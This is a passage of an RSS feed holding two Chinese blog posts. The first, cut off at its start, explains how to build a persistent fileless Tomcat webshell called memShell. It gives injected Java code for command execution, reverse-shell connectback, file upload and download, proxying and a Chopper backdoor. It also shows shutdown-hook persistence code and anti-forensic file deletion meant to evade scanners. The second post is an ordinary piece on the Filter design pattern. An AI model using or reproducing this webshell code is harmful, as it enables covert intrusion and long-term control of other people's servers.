&lt;p&gt;把AgentStarter打包成可执行jar包run.jar，放到D盘根目录。这时候，D盘根目录列表如下：&lt;/p&gt;
&lt;p&gt;下面开启两个命令行窗口，先运行normal.jar，再运行run.jar：&lt;/p&gt;
&lt;p&gt;很明显我们动态改变了正在执行的normal.jar进程中Bird类的say方法体。OK，基本原理就介绍到这里，下面我们拿tomcat来实操。&lt;/p&gt;

&lt;p&gt;  我们想要实现这样一种效果，访问web服务器上的任意一个url，无论这个url是静态资源还是jsp文件，无论这个url是原生servlet还是某个struts action，甚至无论这个url是否真的存在，只要我们的请求传递给tomcat，tomcat就能相应我们的指令。为了达到这个目的，需要找一个特殊的类，这个类要尽可能在http请求调用栈的上方，又不能与具体的URL有耦合，而且还能接受客户端request中的数据。经过分析，发现org.apache.catalina.core.ApplicationFilterChain类的internalDoFilter方法最符合我们的要求，首先看一下internalDoFilter方法的原型：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt; private void internalDoFilter(ServletRequest request, ServletResponse response)
        throws IOException, ServletException {}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;该方法有ServletRequest和ServletResponse两个参数，里面封装了用户请求的request和response。另外，internalDoFilter方法是自定义filter的入口，如下图：&lt;/p&gt;
&lt;p&gt;  市面上各种流行的Java Web类框架，都是通过一个自定义filter来接管用户请求的，所以在在internalDoFilter方法中注入通用型更强。下面我们要做的就是修改internalDoFilter方法的字节码，一般用asm或者javaassist来协助修改字节码。asm执行性能高，不过易用性差，一般像RASP这种对性能要求比较高的产品会优先采用。javaassist执行性能稍差，不过是源代码级的，易用性较好，本文即用此方法。&lt;/p&gt;

&lt;p&gt;  internalDoFilter是memShell接收用户请求的入口，我们在方法开始处插入如下的代码段（节选）：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;try
{
    if (pass_the_world!=null&amp;amp;&amp;amp;pass_the_world.equals(&quot;rebeyond&quot;))
           {
                if (model==null||model.equals(&quot;&quot;))
                {
                    result=Shell.help();
                }
                else if (model.equalsIgnoreCase(&quot;exec&quot;))
                {
                    String cmd=request.getParameter(&quot;cmd&quot;);
                    result=Shell.execute(cmd);
                }
                else if (model.equalsIgnoreCase(&quot;connectback&quot;))
                {
                    String ip=request.getParameter(&quot;ip&quot;);
                    String port=request.getParameter(&quot;port&quot;);
                    result=Shell.connectBack(ip, port);
                }
                else if (model.equalsIgnoreCase(&quot;urldownload&quot;))
                {
                    String url=request.getParameter(&quot;url&quot;);
                    String path=request.getParameter(&quot;path&quot;);
                    result=Shell.urldownload(url, path);
                }
                else if (model.equalsIgnoreCase(&quot;list&quot;))
                {
                    String path=request.getParameter(&quot;path&quot;);
                    result=Shell.list(path);
                }
                else if (model.equalsIgnoreCase(&quot;download&quot;))
                {
                    String path=request.getParameter(&quot;path&quot;);
                    java.io.File f = new java.io.File(path);
                    if (f.isFile()) {
                        String fileName = f.getName();
                        java.io.InputStream inStream = new java.io.FileInputStream(path);
                        response.reset();
                        response.setContentType(&quot;bin&quot;);
                        response.addHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename=\&quot;&quot; + fileName + &quot;\&quot;&quot;);
                        byte[] b = new byte[100];
                        int len;
                            while ((len = inStream.read(b)) &amp;gt; 0)
                                response.getOutputStream().write(b, 0, len);
                            inStream.close();
                            return;

                    }
                }
                else if (model.equalsIgnoreCase(&quot;upload&quot;))
                {
                    String path=request.getParameter(&quot;path&quot;);
                    String fileContent=request.getParameter(&quot;fileContent&quot;);
                    result=Shell.upload(path, fileContent);
                }
                else if (model.equalsIgnoreCase(&quot;proxy&quot;))
                {
                    new Proxy().doProxy(request, response);
                    return;
                }
                else if (model.equalsIgnoreCase(&quot;chopper&quot;))
                {
                    new Evaluate().doPost(request, response);
                    return;
                }
                response.getWriter().print(result);
                return;
            }

        }
        catch(Exception e)
        {
            response.getWriter().print(e.getMessage());
        }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;  首先判断是否有pass_the_world密码字段，如果请求中没有带pass_the_world字段，说明是正常的访问请求，直接转到正常的处理流程中去，不进入webshell流程，避免影响正常业务。如果请求中有pass_the_world字段且密码正确，再判断当前请求的model类型，分别分发到不通的处理分支中去。为了避免对internalDoFilter自身做太大的改动，我把一些比较复杂的逻辑抽象到了外部agent.jar中去实现，由于外部jar包和javax.servlet相关的类classloader不一致，外部jar包中用到了反射的方法去执行一些无法找到的类，比如ServletRquest、ServletResponse等。&lt;/p&gt;
&lt;p&gt;  最终我们生成了2个jar包，一个inject.jar（功能类似前文demo中的run.jar），用来枚举当前机器上的jvm实例并进行代码注入。一个agent.jar，包含我们自定义的常见shell类功能，agent.jar会被inject.jar注入到tomcat进程中。执行java –jar inject.jar完成进程注入动作之后，可以把这两个jar包删除，这样我们就拥有了一个memShell，完全存在于内存中的webshell，硬盘上没有任何痕迹，再也不用担心各种webshell扫描工具，IPS，页面防篡改系统，一切看上去好像很完美。&lt;/p&gt;
&lt;p&gt;  但是……&lt;/p&gt;
&lt;p&gt;  内存中的数据，在进程关闭后就会丢失，如果tomcat被重启，我们的webshell也会随之消失，那岂不是然并卵？当然不是。&lt;/p&gt;

&lt;p&gt;  既然文章标题提到了我们要实现的是不死webshell，就一定要保证在tomcat服务重启后还能存活。memShell通过设置Java虚拟机的关闭钩子ShutdownHook来达到这个目的。ShutdownHook是JDK提供的一个用来在JVM关掉时清理现场的机制，这个钩子可以在如下场景中被JVM调用：&lt;/p&gt;
&lt;ul readability=&quot;2&quot;&gt;&lt;li&gt;1.程序正常退出&lt;/li&gt;
&lt;li&gt;2.使用System.exit()退出&lt;/li&gt;
&lt;li&gt;3.用户使用Ctrl+C触发的中断导致的退出&lt;/li&gt;
&lt;li&gt;4.用户注销或者系统关机&lt;/li&gt;
&lt;li&gt;5.OutofMemory导致的退出&lt;/li&gt;
&lt;li readability=&quot;7&quot;&gt;
&lt;p&gt;6.Kill pid命令导致的退出所以ShutdownHook可以很好的保证在tomcat关闭时，我们有机会埋下复活的种子：）如下为我们自定义的ShutdownHook代码片段：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt; public static void persist() {
     try {
         Thread t = new Thread() {
             public void run() {
                 try {
                     writeFiles(&quot;inject.jar&quot;,Agent.injectFileBytes);
                     writeFiles(&quot;agent.jar&quot;,Agent.agentFileBytes);
                     startInject();
                 } catch (Exception e) {

                 }
             }
         };
         t.setName(&quot;shutdown Thread&quot;);
         Runtime.getRuntime().addShutdownHook(t);
     } catch (Throwable t) {
     }&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;JVM关闭前，会先调用writeFiles把inject.jar和agent.jar写到磁盘上，然后调用startInject，startInject通过Runtime.exec启动java -jar inject.jar。&lt;/p&gt;

&lt;p&gt;  下面我们来梳理一下memShell的整个植入流程：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;1.将inject.jar和agent.jar上传至目标Web Server任意目录下。&lt;/li&gt;
&lt;li&gt;2.以tomcat进程启动的OS用户执行java –jar inject.jar。&lt;/li&gt;
&lt;li&gt;3.inject.jar会通过一个循环遍历查找Web Server上的JVM进程，并把agent.jar注入进JVM进程中，直到注入成功后，inject.jar才会退出。&lt;/li&gt;
&lt;li&gt;4.注入成功后，agent.jar执行agentmain方法，该方法主要做以下几件事情：
&lt;ul&gt;&lt;li&gt;a) 遍历所有已经加载的类，查找“org.apache.catalina.core.ApplicationFilterChain”，并对该类的internalDoFilter方法进行修改。&lt;/li&gt;
&lt;li&gt;b) 修改完之后，把磁盘上的inject.jar和agent.jar读进tomcat内存中。&lt;/li&gt;
&lt;li&gt;c) 对memShell做初始访问。为什么要做一次初始化访问呢？因为我们下一步要从磁盘上删掉agent.jar和inject.jar，在删除之前如果没有访问过memShell的话，memShell相关的一些类就不会加载进内存，这样后续我们在访问memShell的时候就会报ClassNotFound异常。有两种方法初始化类，第一是挨个把需要的类手动加载一次，第二是模拟做一次初始化访问，memShell采用的后者。&lt;/li&gt;
&lt;li&gt;d) 删除磁盘上的inject.jar和agent.jar。当Web Server是Linux系统的时候，正常删除文件即可。当Web Server是Windows系统的时候，由于Windows具有文件锁定机制，当一个文件被其他程序占用时，这个文件是处于锁定状态不可删除的，inject.jar正在被JVM所占用。要删除这个jar包，需要先打开该进程，遍历该进程的文件句柄，通过DuplicateHandle来巧妙的关闭文件句柄，然后再执行删除，我把这个查找句柄、关闭句柄的操作写进了一个exe中，memShell判断WebServer是Windows平台时，会先释放这个exe文件来关闭句柄，再删除agent.jar。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;5.memShell注入完毕，正常接收请求，通过访问http://xxx/anyurl?show_the_world=password可以看到plain风格的使用说明（为什么是plain风格，因为懒）。&lt;/li&gt;
&lt;li&gt;6.当JVM关闭时，会首先执行我们注册的ShutdownHook：
&lt;ul&gt;&lt;li&gt;a)把第4（b）步中我们读进内存的inject.jar和agent.jar写入JVM临时目录。&lt;/li&gt;
&lt;li&gt;b)执行java -jar inject.jar，此后过程便又回到上述第3步中，形成一个闭环结构。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;到此，memShell的整个流程就介绍完毕了。&lt;/p&gt;

&lt;ul readability=&quot;2&quot;&gt;&lt;li&gt;1.memShell实现了常见的webshell的功能，像命令执行：&lt;/li&gt;
&lt;li readability=&quot;3&quot;&gt;
&lt;p&gt;2.memShell通过内嵌reGeorg实现了socks5代理转发功能，方便内网渗透：&lt;br/&gt;这里要说明一下，因为reGeorg官方的reGeorgSocksProxy.py不支持带参数的URL，所有我们要稍微改造一下reGeorgSocksProxy.py：&lt;/p&gt;
&lt;p&gt;把第375行改成上图所示即可。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;3.memShell内嵌了菜刀一句话：&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;4.只设置访问密码，不设置model类型可查看plain style的help：&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;  本文仅以Java+tomcat为例来介绍内存webshell的原理及实现，其他几种容器如JBOSS、WebLogic等，只是“定位关键类”那一步稍有不同，其他环节都是通用的。理论上其他几种语言同样可以实现类似的功能，我就算给大家抛砖引玉了。&lt;/p&gt;
&lt;p&gt;  Github代码地址：&lt;a href=&quot;https://github.com/rebeyond/memShell&quot; class=&quot;uri&quot;&gt;https://github.com/rebeyond/memShell&lt;/a&gt;&lt;br/&gt;  里面有很多功能还有可以改进的地方，后面有时间再慢慢完善吧。 &lt;/p&gt;
&lt;p&gt;  最后，华为终端云SilverNeedle团队诚招各路安全人才（APT方向），待遇优厚，欢迎推荐和自荐：）&lt;/p&gt;

</description>
<pubDate>Fri, 21 Sep 2018 06:00:00 +0000</pubDate>
<dc:creator>rebeyond</dc:creator>
<og:description>引子 上周末，一个好兄弟找我说一个很重要的目标shell丢了，这个shell之前是通过一个S2代码执行的漏洞拿到的，现在漏洞还在，不过web目录全部不可写，问我有没有办法搞个webshell继续做内网</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/rebeyond/p/9686213.html</dc:identifier>
</item>
<item>
<title>Filter 设计模式编码实践 - haifeiWu</title>
<link>http://www.cnblogs.com/haifeiWu/p/9685929.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/haifeiWu/p/9685929.html</guid>
<description>&lt;blockquote readability=&quot;3.9130434782609&quot;&gt;
&lt;p&gt;原文地址： &lt;a href=&quot;http://www.hchstudio.cn/article/2018/4008/?_ref=bokeyuan&quot;&gt;haifeiWu和他朋友们的博客&lt;/a&gt;&lt;br/&gt;博客地址：&lt;a href=&quot;http://www.hchstudio.cn/article/2018/4008/?_ref=bokeyuan&quot;&gt;www.hchstudio.cn&lt;/a&gt;&lt;br/&gt;欢迎转载，转载请注明作者及出处，谢谢！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;最近项目中遇到各种输出数据监控，数据校验等逻辑，一个个实现很是麻烦。项目是中途接手的，不是很熟悉，偶然一天发现项目中对 Filter 的使用扩展起来很是方便，所以，今天楼主来分享下，也为自己学习做个记录。下面我们从三方面来阐述。&lt;br/&gt;&lt;/p&gt;
&lt;h2 id=&quot;什么是-filter&quot;&gt;什么是 Filter&lt;/h2&gt;
&lt;p&gt;Filter 在设计模式里面被称为责任链设计模式，顾名思义，我们可以在这条责任链上对一组数据做不同的处理。这种类型的设计模式属于结构型模式，它结合多个标准来获得单一标准。UML见下图，&lt;br/&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2018/9/21/165fa0c2905483f7?w=731&amp;amp;h=374&amp;amp;f=png&amp;amp;s=13364&quot; alt=&quot;Filter设计模式&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;为什么要使用-filter&quot;&gt;为什么要使用 Filter&lt;/h2&gt;
&lt;p&gt;好处是显而易见的，它使我们的代码将请求和处理分开。请求者可以不知道是谁处理的，处理者可以不用知道请求的全貌，两者解耦，提高系统的灵活性。从而我们的代码更加简洁跟易于扩展，而不是机械重复的Ctrl+C，Ctrl+V。当然好处还有好多，楼主就不在这里赘述了，感兴趣的小伙伴自行Google。&lt;/p&gt;
&lt;h2 id=&quot;怎么用-filter-项目中的代码实现逻辑&quot;&gt;怎么用 Filter 项目中的代码实现逻辑&lt;/h2&gt;
&lt;p&gt;定义 Filter 接口，接口中定义进行数据处理的方法。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public interface IDataHandlerFilter {

    void filter(DataPackage dataPackage);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;统一数据发送端，将业务系统处理好的数据，统一发送到 kafka。当然我们还可以实现 Filter 对数据进行其他处理。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class DataSendHandlerFilter implements IDataHandlerFilter {

    public static final Logger log = LogManager.getLogger(DataSendHandlerFilter.class);

    private int logCenterType;

    //数据源类型 0-实时数据 1-wifi数据
    private String resourceType = StringUtils.isBlank(Repository.getCityConfig().getResourceType()) ? &quot;0&quot; : Repository.getCityConfig().getResourceType();

    public DataSendHandlerFilter() {

        logCenterType = Repository.getSysConfig().getLogCenterType();

        //初始化kafka
        if (logCenterType == Constant.LogcenterType.KAFKA){
            KafkaProducerHelper.init(Repository.getCityConfig().getCityId(), Repository.getSysConfig());
            log.info(&quot;初始化kafka&quot;);
        }
    }

    @Override
    public void filter(DataPackage dataPackage) {

        GpsData gpsData = dataPackage.getTargetData();

        /*重复数据和时间格式错误数据不发送*/
        if (null != gpsData &amp;amp;&amp;amp; !gpsData.isError() &amp;amp;&amp;amp; logCenterType == Constant.LogcenterType.KAFKA) {
            if (gpsData.isGps()) {
                KafkaProducerHelper.sendData(gpsData.toGpsStr(resourceType));
            }

            if (gpsData.isStn()) {
                KafkaProducerHelper.sendData(gpsData.toStnStr(resourceType));
            }
        }
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;设置系统要使用的 Filter ，根据具体业务有所不同。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class HanderFilterUtil {
    
    private static List&amp;lt;IDataHandlerFilter&amp;gt; list;

    /**
     * 这个是有先后顺序的
     * @return
     */
    public static List&amp;lt;IDataHandlerFilter&amp;gt; getDefaultFilter(SysConfig sysConfig, CityConfig cityConfig){
        
        if (null == list){
            list = new ArrayList&amp;lt;&amp;gt;();
        }
        
        //默认提供接收日志、重复校验、时间格式校验、属性校验、数据转发过滤器
        list.add(new RepeatHandlerFilter());
        list.add(new DataLogHandlerFilter());
        list.add(new DataSendHandlerFilter());
        // ......
        return list;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;最后我们通过调用 getDefaultFilter 方法来决定我们系统中使用哪几种 Filter 来处理数据。&lt;/p&gt;
&lt;h2 id=&quot;小结&quot;&gt;小结&lt;/h2&gt;
&lt;p&gt;本文中的代码不能直接运行，只是提供一种写代码的思路，小伙伴遇到此种场景可以借鉴一下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2018/9/21/165fa0c2852d91f8?w=258&amp;amp;h=258&amp;amp;f=jpeg&amp;amp;s=27615&quot; title=&quot;关注我们&quot; alt=&quot;关注我们&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 21 Sep 2018 04:13:00 +0000</pubDate>
<dc:creator>haifeiWu</dc:creator>
<og:description>原文地址：</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/haifeiWu/p/9685929.html</dc:identifier>
</item>
</channel>
</rss>